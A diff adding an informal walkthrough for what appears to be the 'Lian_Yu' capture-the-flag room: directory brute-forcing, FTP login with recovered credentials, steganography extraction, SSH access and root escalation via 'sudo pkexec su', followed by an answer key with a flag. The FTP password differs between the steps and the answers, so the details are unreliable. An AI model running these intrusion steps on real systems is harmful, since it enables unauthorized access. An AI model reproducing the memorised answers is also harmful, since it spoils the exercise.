@@ -1,0 +1,99 @@
+###To solve lian_yu
+
+1)  nmap scanning
+    
+    [nmap -sC -sV IP]
+
+2) then go for gobuster
+
+  1.  [gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt]
+
+===> then go try Browsser "IP/island"  And we will find 'vigilante'
+
+
+  2.  [gobuster dir -u http://IP/island -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt]
+
+===> then now try  on Browser "IP/island/2100
+
+  3.  [gobuster dir -u http://IP/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt]
+
+===>  then now go try "IP/island/2100/green_arrow.ticket/"
+
+   ****   Boom! you'll find 'RTyByhBQdscx' bay base58 ='!#th3h00d'  on cyber chef
+
+--------ON COMMAND 
+
+      [hash-identifier RTyByhBQdscx]
+
+----ON nmap command line-----------------------
+        
+        [ftp IP]
+
+ --> name:'vigilante'   pass: '!#th3h00d'
+
+        [ls]
+
+        [cd ..]
+
+        [ls]
+        [cd vigilante]
+        [lcd]
+        [lcd pictures]
+        [mget filename *]  After Downloading of all three files 
+        [ls]
+        [bye]
+-----
+       [cd pictures]
+       [ls]
+       [hexeditor leave_me_alone.jpg]
+===> then edit it as '89 50 4E 47, 0D 0A 1A  0A, 00 00 00 0D, 49 48 44 52'
+Save and exit.
+===> then go to the folder where file is located and find the image, then see the password is 'password'
+  
+  then now,
+            
+            [ls]
+
+            [steghide extract -sf aa.jpg]
+
+     pass: 'password' 
+  then we will get 'ss.zip' Gooo! file folder and find it 
+  
+  **from  'shado'  you will get 'M3tahuman'
+            
+            [cd]
+            [ssh slade@IP]
+            -->yes
+            -->pass:'M3tahuman'
+            [whoami]
+            [ls]
+            [cat user.txt]
+            [sudo -l]
+            --> pass:'M3tahuman'
+            [sudo pkexec su]
+            [whoami]
+            [ls]
+            [cat root.txt]
+DONE!
+
+
+
+
+
+
+
+
+Answers:  what is the file name you found? ='green_arrow.ticket'
+          what is the FTP password?= '!#th3h00h'
+          what is the file name with SSH password?='shado'
+          user.txt='THM{P30P7E_K33P_53CRETS_COMPUT3R5_DON'T}
+
+
+
+
+
+
+
+
+
+
